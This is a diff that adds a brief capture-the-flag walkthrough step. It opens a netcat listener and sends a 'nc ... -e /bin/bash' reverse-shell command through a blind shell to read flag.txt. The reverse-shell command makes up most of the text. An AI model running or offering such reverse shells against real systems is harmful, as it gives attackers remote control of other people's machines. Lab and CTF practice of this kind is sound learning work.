@@ -1,0 +1,12 @@
+Create a listener on your machine.
+nc -lnvp 400
+
+
+and then send the command nc ip_of_your_machine 400 -e /bin/bash on the blind Shell 
+
+
+go to your machine's terminal and type ls 
+and cat flag.txt 
+
+This is a reverse shell . 
+
